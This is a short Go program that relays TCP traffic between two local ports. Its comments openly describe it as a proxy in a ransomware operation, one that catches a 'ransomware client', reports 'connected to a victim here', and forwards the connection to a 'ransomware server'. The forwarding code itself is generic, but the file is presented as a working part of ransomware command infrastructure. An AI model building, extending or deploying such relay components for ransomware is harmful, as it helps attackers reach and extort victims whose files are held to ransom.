package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"time"
)

// check for error and exit if there is one
func check_err(err error) {
	if err != nil {
		fmt.Println("err :", err)
		os.Exit(0)
	}
}

// send write buffer from client to read buffer from server
// and vise versa
func copy(dest net.Conn, src net.Conn) {
	io.Copy(dest, src)
	fmt.Println("Copied !")
	return
}

// connect to the ransomware server
func connServ(server_port string) net.Conn {
	target, err := net.Dial("tcp", ":"+server_port)
	check_err(err)
	fmt.Println("connected to the server")
	return target
}

// listen for incoming ransomware client
func clientListen(port string) (net.Listener, error) {
	return net.Listen("tcp", ":"+port)
}

func main() {
	// get the ports number from the command line
	if len(os.Args) != 3 {
		fmt.Println("Usage: proxy <client port> <server port>")
		os.Exit(0)
	}
	client_port := os.Args[1]
	server_port := os.Args[2]
	// listen for incoming ransomware client
	ln, err := clientListen(client_port)
	check_err(err)
	defer ln.Close()
	for {
		// connect to the server
		target := connServ(server_port)
		// catch a ransomware client
		client, err := ln.Accept()
		check_err(err)
		fmt.Println("connected to a victim here")
		// transfer data
		go copy(target, client)
		go copy(client, target)
		// the transaction has to be done in a short time
		time.Sleep(5 * time.Second)
		client.Close()
		target.Close()

	}
}
